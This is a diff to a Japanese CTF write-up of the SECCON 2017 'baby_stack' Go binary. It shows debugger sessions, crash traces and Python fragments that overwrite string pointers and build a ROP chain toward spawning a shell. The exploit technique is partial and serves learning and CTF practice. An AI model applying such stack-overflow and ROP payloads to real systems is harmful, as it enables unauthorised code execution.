@@ -235,10 +235,6 @@ gef➤  dereference
 #+begin_example
 gef➤  b *0x4012a4
 gef➤  g
-[New LWP 53720]
-[New LWP 53721]
-[New LWP 53722]
-[New LWP 53723]
 Please tell me your name >> hoge
 Give me your message >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
 gef➤  dereference
@@ -256,17 +252,7 @@ gef➤  dereference
 runtime: out of memory: cannot allocate 7016996765293477888-byte block (1048576 in use)
 fatal error: out of memory
 
-runtime stack:
-runtime.throw(0x50c400, 0xd)
-        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
-runtime.largeAlloc(0x6161616161616161, 0x3, 0x0)
-        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
-runtime.mallocgc.func3()
-        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
-runtime.systemstack(0x5a0300)
-        /usr/lib/go-1.6/src/runtime/asm_amd64.s:291 +0x79
-runtime.mstart()
-        /usr/lib/go-1.6/src/runtime/proc.go:1051
+...
 
 goroutine 1 [running]:
 runtime.systemstack_switch()
@@ -281,10 +267,7 @@ runtime.slicebytetostring(0x0, 0x6161616161616161, 0x6161616161616161, 0x6161616
         /usr/lib/go-1.6/src/runtime/string.go:93 +0x6f fp=0xc820051d50 sp=0xc820051cb8
 main.main()
         /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x2f8 fp=0xc820051f50 sp=0xc820051d50
-[LWP 53723 exited]
-[LWP 53722 exited]
-[LWP 53721 exited]
-[LWP 53720 exited]
+...
 [Inferior 1 (process 53719) exited with code 02]
 #+end_example
 
@@ -308,17 +291,7 @@ gef➤
 runtime: out of memory: cannot allocate 7089054359331405824-byte block (1048576 in use)
 fatal error: out of memory
 
-runtime stack:
-runtime.throw(0x50c400, 0xd)
-        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
-runtime.largeAlloc(0x6261616161616162, 0x3, 0x0)
-        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
-runtime.mallocgc.func3()
-        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
-runtime.systemstack(0x5a0300)
-        /usr/lib/go-1.6/src/runtime/asm_amd64.s:291 +0x79
-runtime.mstart()
-        /usr/lib/go-1.6/src/runtime/proc.go:1051
+...
 
 goroutine 1 [running]:
 runtime.systemstack_switch()
@@ -375,10 +348,6 @@ gef➤ dereference
      #+begin_src python
        pattern = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac'
        buf2 = list(pattern)
-
-       # name
-       buf2[0x68:0x70] = p64(please_ptr) # string ptr
-       buf2[0x70:0x78] = p64(0x6)        # string size
 
        # msg
        buf2[0xc8:0xd0] = p64(please_ptr) # string ptr
@@ -464,7 +433,10 @@ gef➤ dereference
      このため、先程と同様に ~"Please"~ の文字列を指すようにそれぞれ値を格納し、再度プログラムを実行すると、
      先程までのエラーを回避し、リターンアドレスを書き換えることができる。
 
+     次に、リターンアドレスを書き換えることにより、シェルの起動を行う。
+
 *** シェルの起動
+    
     
 ** solverの作成
 *** ROP
@@ -529,7 +501,7 @@ gef➤ dereference
       ## rdx = 0
       buf2 += p64(pop_rdx)
       buf2 += p64(0x0)
-      buf2 += b'a'*0x38
+      buf2 += b'a'*0x38    # add rsp, 0x38
 
       ## rsi = 0
       buf2 += p64(pop_rsi)
